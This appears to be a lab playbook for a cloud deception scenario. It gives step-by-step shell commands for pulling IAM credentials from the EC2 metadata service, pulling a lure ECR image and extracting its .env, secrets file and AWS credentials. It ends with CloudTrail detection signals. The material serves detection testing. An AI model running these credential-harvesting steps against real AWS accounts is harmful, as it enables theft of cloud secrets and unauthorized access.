# Scenario 5 — Abuse Steps: ECR Container Image with Fake PII & Credentials

## Prerequisites
- Completed scenario-4 abuse steps (on the bastion instance)
- OR: any IAM identity with ECR read access in the account
- Docker installed (on bastion or attacker machine)

## Step-by-Step (from scenario-4 bastion)

```bash
# --- Already on prod-bastion-host from scenario-4 ---

# 1. Check instance profile via metadata
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: prod-bastion-ecr-role

# 2. Get temporary credentials from instance profile
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-bastion-ecr-role | jq .

# 3. Discover ECR repositories
ACCOUNT_ID=$(curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | jq -r .AccountId)
REGION="us-west-2"

aws ecr describe-repositories --query "repositories[*].[repositoryName,repositoryUri]" --output table

# 4. List images in the lure repo
aws ecr list-images --repository-name prod-payment-service --output table

# 5. Authenticate Docker to ECR
aws ecr get-login-password --region ${REGION} | docker login --username AWS --password-stdin ${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com

# 6. Pull the lure image
docker pull ${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/prod-payment-service:latest

# 7. Inspect image layers for secrets (without running)
docker history ${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/prod-payment-service:latest
docker inspect ${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/prod-payment-service:latest

# 8. Extract files from the image
CONTAINER_ID=$(docker create ${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/prod-payment-service:latest)

# Extract .env
docker cp ${CONTAINER_ID}:/app/.env ./extracted-env
cat ./extracted-env

# Extract secrets.json
docker cp ${CONTAINER_ID}:/app/config/secrets.json ./extracted-secrets.json
cat ./extracted-secrets.json | jq .

# Extract AWS credentials
docker cp ${CONTAINER_ID}:/root/.aws/credentials ./extracted-aws-creds
cat ./extracted-aws-creds

# Clean up container
docker rm ${CONTAINER_ID}

# 9. Attempt to use extracted credentials (triggers detection)
# Example: try Stripe key from the image
# curl https://api.stripe.com/v1/charges -u "sk_live_51NxGr7eD48IqMzkXEbsjT2ze1qp8dc:"

# Example: try AWS ASIA credentials from the image
# export AWS_ACCESS_KEY_ID=ASIAPLACHOLDER000001
# export AWS_SECRET_ACCESS_KEY=<extracted_key>
# export AWS_SESSION_TOKEN=<extracted_token>
# aws sts get-caller-identity
```

## Standalone Path (without scenario-4)

```bash
# 1. Assume any role with ECR access, or use existing credentials
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
REGION="us-west-2"

# 2. Discover ECR repos
aws ecr describe-repositories --query "repositories[*].[repositoryName,repositoryUri]" --output table

# 3. Authenticate and pull
aws ecr get-login-password --region ${REGION} | docker login --username AWS --password-stdin ${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com
docker pull ${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/prod-payment-service:latest

# 4. Continue from step 7 above
```

## Detection Signals
- CloudTrail: Instance metadata queries (if IMDSv2 enforced, `GetMetadataToken`)
- CloudTrail: `GetAuthorizationToken` on ECR
- CloudTrail: `DescribeRepositories`, `ListImages` on ECR
- CloudTrail: `BatchGetImage`, `GetDownloadUrlForLayer` — image pull
- Any attempted use of credentials extracted from the image
- Full chain from scenario-4: SG modification + instance start + SSH + ECR pull
